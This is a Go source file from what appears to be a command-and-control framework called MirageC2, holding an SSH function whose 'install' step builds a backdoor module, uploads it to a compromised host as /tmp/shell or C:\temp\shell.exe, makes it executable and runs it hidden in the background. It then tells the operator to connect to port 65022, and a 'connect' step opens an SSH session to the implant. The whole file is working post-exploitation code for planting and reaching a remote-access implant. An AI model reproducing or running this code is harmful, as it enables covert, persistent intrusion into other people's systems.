package sessionbase

import (
	"MirageC2_V1.0/app/exchange"
	"MirageC2_V1.0/app/module"
	"MirageC2_V1.0/app/module/template"
	"MirageC2_V1.0/public/check"
	"MirageC2_V1.0/public/common"
	"fmt"
	"time"
)

func SSH(sess_parts []string, intID int) {

	filename := ""
	savename := "shell"
	job := &common.Jobs[intID-1]
	args := len(sess_parts)

	switch args {
	case 2:
		if sess_parts[1] == "install" {
			fmt.Printf("[+] 正在部署交互式模块，请等待.....\n")
			restore := common.SuppressOutput()
			template.CreateModule("ssh", job.Platform, "amd64")
			filename = "app/module/release/amd64_" + job.Platform + "_ssh"
			if job.Platform == "windows" {
				filename = filename + ".exe"
				savename = "C:\\temp\\" + savename + ".exe"
			} else {
				savename = "/tmp/shell"
			}
			exchange.FileControl("upload", filename, savename, intID)
			if job.Platform == "linux" || job.Platform == "darwin" {
				job.Tasks[90000] = "chmod +x /tmp/shell"
			}
			restore()
			time.Sleep(time.Duration(job.Sleep) * time.Second)

			command := "/tmp/shell"
			if job.Platform == "windows" {
				command = "cmd /c start /b C:\\temp\\shell.exe"
			}
			job.Tasks[99995] = command
			fmt.Printf("[*] SSH模块部署完成，请连接目标服务器的65022端口。\n")
			fmt.Printf("[*] Usage：ssh connect <ip>\n")
		}
	case 3:
		if sess_parts[1] == "connect" {
			serverIP := sess_parts[2] + ":65022"
			if check.IPCheck(serverIP) {
				module.SSHClient(serverIP)
			} else {
				fmt.Printf("[*] 请确认输入的IP地址等参数，Usage：ssh connect <ip>\n")
			}
		}
	}

}
